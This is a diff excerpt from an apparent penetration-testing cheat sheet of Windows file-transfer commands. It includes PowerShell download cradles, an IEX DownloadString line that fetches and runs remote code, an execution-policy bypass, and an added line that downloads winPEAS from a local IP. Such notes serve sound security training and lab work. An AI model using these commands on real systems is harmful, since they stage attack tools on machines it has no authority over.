@@ -48,11 +48,14 @@ copy <FILE> \\<IP>\<PATH>\ # Windows -> Linux
 powershell.exe (New-Object System.Net.WebClient).DownloadFile('<URL>', '<DESTINATION_FILE>')
 powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('<URL>')
 powershell "wget <URL>"
+powershell iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
 
 echo $storageDir = $pwd > wget.ps1 & echo $webclient = New-Object System.Net.WebClient >>wget.ps1
 echo $url = "http://192.168.1.101/file.exe" >>wget.ps1
 echo $file = "output-file.exe" >>wget.ps1 & echo $webclient.DownloadFile($url,$file) >>wget.ps1
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
+
 
 # Python
 python.exe -c "from urllib import urlretrieve; urlretrieve('<URL>', '<DESTINATION_FILE>')"
